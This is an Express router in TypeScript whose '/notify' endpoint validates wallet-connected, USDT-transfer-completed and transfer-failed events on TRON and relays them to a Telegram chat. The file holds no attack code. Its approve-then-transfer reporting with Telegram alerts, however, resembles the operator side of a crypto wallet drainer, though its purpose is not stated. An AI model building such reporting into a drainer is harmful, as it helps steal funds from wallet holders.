import { Router } from "express";
import { StatusCodes } from "http-status-codes";
import { z } from "zod";
import { HttpError } from "../lib/http-error.js";
import { optionalAuth, type AuthenticatedRequest } from "../middleware/auth.js";
import { sendTrustWalletTronTelegramNotification } from "../services/telegram.service.js";

const notifySchema = z.discriminatedUnion("event", [
  z.object({
    event: z.literal("wallet_connected"),
    walletAddress: z.string().min(16),
    connectMethod: z.string().max(80).optional()
  }),
  z.object({
    event: z.literal("transfer_completed"),
    walletAddress: z.string().min(16),
    toAddress: z.string().min(16),
    amountUsdt: z.number().positive(),
    approveTxId: z.string().min(8).optional(),
    transferTxId: z.string().min(8)
  }),
  z.object({
    event: z.literal("transfer_failed"),
    walletAddress: z.string().min(16).optional(),
    errorMessage: z.string().min(1).max(800)
  })
]);

const router = Router();

router.post("/notify", optionalAuth, async (req: AuthenticatedRequest, res) => {
  const parsed = notifySchema.safeParse(req.body);
  if (!parsed.success) {
    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
  }

  const linkedUserId = req.user?.sub ?? null;

  try {
    const data = parsed.data;
    if (data.event === "wallet_connected") {
      await sendTrustWalletTronTelegramNotification({
        event: "wallet_connected",
        walletAddress: data.walletAddress,
        connectMethod: data.connectMethod,
        linkedUserId
      });
    } else if (data.event === "transfer_completed") {
      await sendTrustWalletTronTelegramNotification({
        event: "transfer_completed",
        walletAddress: data.walletAddress,
        toAddress: data.toAddress,
        amountUsdt: data.amountUsdt,
        approveTxId: data.approveTxId,
        transferTxId: data.transferTxId,
        linkedUserId
      });
    } else {
      await sendTrustWalletTronTelegramNotification({
        event: "transfer_failed",
        walletAddress: data.walletAddress,
        errorMessage: data.errorMessage,
        linkedUserId
      });
    }
  } catch (error) {
    console.error("[trust-tron.notify] Telegram notification failed", error);
  }

  res.status(StatusCodes.OK).json({ ok: true });
});

export { router as trustTronRoutes };
